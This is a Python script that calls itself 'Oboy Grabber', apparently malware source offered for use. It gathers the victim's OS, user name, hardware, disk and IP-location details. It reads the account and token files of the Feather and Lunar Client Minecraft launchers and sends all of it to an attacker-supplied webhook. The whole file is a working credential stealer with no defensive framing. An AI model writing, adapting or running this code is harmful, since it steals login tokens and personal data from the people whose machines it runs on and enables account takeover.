import requests
import platform
import os
import json
import psutil

# Get ip info
def get_ip_info():
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        public_ip = data.get('ip', 'N/A')
        ipv4 = data.get('ipv4', 'N/A')
        ipv6 = data.get('ipv6', 'N/A')
        ip_info = f"Public IP: {public_ip}\n"
        ip_info += f"IPv4: {ipv4}\n"
        ip_info += f"IPv6: {ipv6}\n"
        ip_info += f"City: {data.get('city', 'N/A')}\n"
        ip_info += f"Country: {data.get('country', 'N/A')}\n"
        ip_info += f"Timezone: {data.get('timezone', 'N/A')}\n"
        return ip_info
    except Exception as e:
        return f"Error fetching IP info: {e}"

# Get sys info
def get_system_info():
    system_info = f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    system_info += f"Processor Cores: {os.cpu_count()}\n"

    try:
        import cpuinfo
        cpu_info = cpuinfo.get_cpu_info()
        system_info += f"CPU: {cpu_info['brand_raw']}\n"
    except ImportError:
        system_info += "CPU information not available (install cpuinfo to get CPU details)\n"

    return system_info

# Os stuff
def get_os_info():
    os_info = f"PC Name: {platform.node()}\n"
    os_info += f"PC Username: {os.getlogin()}\n"
    os_info += f"Operating System: {platform.system()} {platform.release()}\n"
    return os_info

def read_accounts_json(file_path):
    try:
        with open(file_path, "r") as accounts_file:
            accounts_data = accounts_file.read()
        return accounts_data
    except Exception as e:
        return f"Error reading accounts.json: {e}"

# get disk information
def get_disk_info():
    partitions = psutil.disk_partitions()
    disk_info = ""
    
    for partition in partitions:
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disk_info += f"Drive: {partition.device}\n"
            disk_info += f"Mountpoint: {partition.mountpoint}\n"
            disk_info += f"File System: {partition.fstype}\n"
            disk_info += f"Total Storage: {usage.total / (1024 ** 3):.2f} GB\n"
            disk_info += f"Used Storage: {usage.used / (1024 ** 3):.2f} GB\n"
            disk_info += f"Free Storage: {usage.free / (1024 ** 3):.2f} GB\n"
            disk_info += f"Usage Percentage: {usage.percent}%\n\n"
        except Exception as e:
            disk_info += f"Error fetching disk info: {e}\n\n"
    
    return disk_info

# Emojis for different parts
emojis = {
    "os": "\U0001F4BB",  # Computer emoji
    "system": "\U0001F4E1",  # Gear emoji
    "ip": "\U0001F4CD",  # Speech balloon emoji
    "feather": "\U0001F426",  # Bird emoji
    "lunar_client": "\U0001F31B",  # Crescent moon emoji
    "disk": "\U0001F4BE",  # Floppy disk emoji
}

# replace the webhook to ur own
webhook_url = "Ur webhook"

feather_accounts_path = os.path.join(os.getenv('APPDATA'), '.feather', 'accounts.json')
feather_accounts_content = read_accounts_json(feather_accounts_path)

lunar_client_accounts_path = os.path.join(os.getenv('USERPROFILE'), '.lunarclient', 'settings', 'game', 'accounts.json')
lunar_client_accounts_content = read_accounts_json(lunar_client_accounts_path)

# Get disk information
disk_information = get_disk_info()

# Create the embed message content
embed_content = {
    "embeds": [
        {
            "title": f"{emojis['os']} Oboy Grabber",
            "url": "https://github.com/FogmaLOL",
            "description": f"{emojis['os']} **OS Info:**\n```{get_os_info()}```\n{emojis['system']} **System Info:**\n```{get_system_info()}```\n{emojis['ip']} **IP Info:**\n```{get_ip_info()}```",
            "color": 0xADD8E6,
            "author": {
                "name": os.getlogin(),
                "icon_url": "https://avatars.githubusercontent.com/u/140769646?v=4"
            }
        },
        {
            "title": f"{emojis['feather']} Feather Token",
            "description": f"```{feather_accounts_content}```",
            "color": 0xADD8E6
        },
        {
            "title": f"{emojis['lunar_client']} Lunar Client Accounts",
            "description": f"```{lunar_client_accounts_content}```",
            "color": 0xADD8E6
        },
        {
            "title": f"{emojis['disk']} Disk Information",
            "description": f"```{disk_information}```",
            "color": 0xADD8E6
        }
    ]
}

# Send the embed message
headers = {
    "Content-Type": "application/json"
}

response = requests.post(webhook_url, data=json.dumps(embed_content), headers=headers)

# Check if the message was successfully sent
if response.status_code == 204:
    print("Embed message sent successfully.")
else:
    print(f"Failed to send embed message. Status code: {response.status_code}")
